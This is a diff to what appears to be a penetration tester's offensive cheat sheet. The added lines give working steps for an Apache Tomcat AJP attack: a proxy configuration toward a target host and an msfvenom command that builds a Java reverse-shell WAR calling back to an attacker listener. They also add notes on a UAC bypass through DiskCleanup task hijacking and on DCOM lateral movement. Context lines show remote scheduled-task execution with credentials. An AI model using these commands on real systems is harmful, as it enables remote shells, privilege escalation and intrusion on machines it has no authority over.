@@ -94,7 +94,38 @@ Remote Execute
     schtasks /create /sc minute /mo 1 /tn "eviltask" /tr calc /ru "SYSTEM" /s dc-mantvydas /u user /p password
     * COPY ANY SYSTEM FILE
       C:\windows\system32\esentutl.exe /y <source-file> /vss /d <dest-file>
+      
+Apache Tomcat JServ exploit
+    https://ionize.com.au/exploiting-apache-tomcat-port-8009-using-apache-jserv-protocol/
+    Install the Dependencies on attack box
+        apt install libapache2-mod-jk a2enmod proxy_ajp
+    Configure Apache
+        ProxyRequests Off
+        # Only allow localhost to proxy requests
+        <Proxy *>
+        Order deny,allow
+        Deny from all
+        Allow from localhost
+        </Proxy>
+        # Change the IP address in the below lines to the remote servers IP address hosting the Tomcat instance
+        ProxyPass   / ajp://192.168.109.134:8009/
+        ProxyPassReverse   / ajp://192.168.109.134:8009/
+    Start Apache
+        systemctl start apache2
+    Exploit
+        msfvenom -p java/shell_reverse_tcp LHOST=192.168.109.129 LPORT=4444 -f war > shell3.war
+    Start Listener
+    Once uploaded make sure to visit the malicious URL (available in applications list) at least once to cause the WAR to execute.
   
+Metasploit Pro Exploits
+  Windows Escalate UAC Protection Bypass
+      Scheduled Tasks Microsoft\Windows\DiskCleanup run with higest prividleges
+      Change %windir% environment variable to a folder with your payload
+
+  DCOM Exec
+      https://ired.team/offensive-security/lateral-movement/t1175-distributed-component-object-model
+      Remote DCOM command execution using credentials
+
 File Share
   WebDav (Host File over port 80)
     pip install wsgidav cheroot
